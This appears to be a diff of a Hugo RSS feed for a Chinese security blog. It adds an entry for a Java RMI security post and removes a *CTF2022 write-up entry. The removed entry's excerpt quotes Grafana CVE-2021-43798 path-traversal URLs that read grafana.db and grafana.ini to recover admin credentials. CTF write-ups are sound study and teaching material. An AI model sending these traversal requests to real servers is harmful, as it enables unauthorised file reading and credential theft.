@@ -4,7 +4,15 @@
         <link>https://example.com/posts/</link>
         <description>所有文章 | Huamang&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>3364744355@qq.com (Huamang)</managingEditor>
-            <webMaster>3364744355@qq.com (Huamang)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 19 Sep 2022 02:09:13 &#43;0800</lastBuildDate><atom:link href="https://example.com/posts/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>3364744355@qq.com (Huamang)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 27 Sep 2022 14:43:46 &#43;0800</lastBuildDate><atom:link href="https://example.com/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>[Java安全]RMI</title>
+    <link>https://example.com/java%E5%AE%89%E5%85%A8_rmi/</link>
+    <pubDate>Tue, 27 Sep 2022 14:43:46 &#43;0800</pubDate>
+    <author>Huamang</author>
+    <guid>https://example.com/java%E5%AE%89%E5%85%A8_rmi/</guid>
+    <description><![CDATA[前言 RMI全程Remote Method Invocation，远程⽅法调⽤ 他的功能是让一个Java虚拟机上的对象调用另一个Java虚拟机中对象上的方法，]]></description>
+</item>
+<item>
     <title>SSTI_OF_FLASK</title>
     <link>https://example.com/ssti/</link>
     <pubDate>Mon, 19 Sep 2022 02:09:13 &#43;0800</pubDate>
@@ -75,14 +83,6 @@
     <author>Huamang</author>
     <guid>https://example.com/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</guid>
     <description><![CDATA[前言 （使用github图床，请科学上网） 搭建校赛平台，这里是发现有一个很好看的ctfd的主题pixo 所以就想着来搭建这么一个平台，这次我打算]]></description>
-</item>
-<item>
-    <title>[*CTF2022] WP</title>
-    <link>https://example.com/ctf2022_wp/</link>
-    <pubDate>Sun, 17 Apr 2022 18:29:06 &#43;0800</pubDate>
-    <author>Huamang</author>
-    <guid>https://example.com/ctf2022_wp/</guid>
-    <description><![CDATA[Web oh-my-grafana 存在CVE-2021-43798 paylaod 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 1 2 3 4 5 # default admin user, created on startup admin_user =]]></description>
 </item>
 </channel>
 </rss>
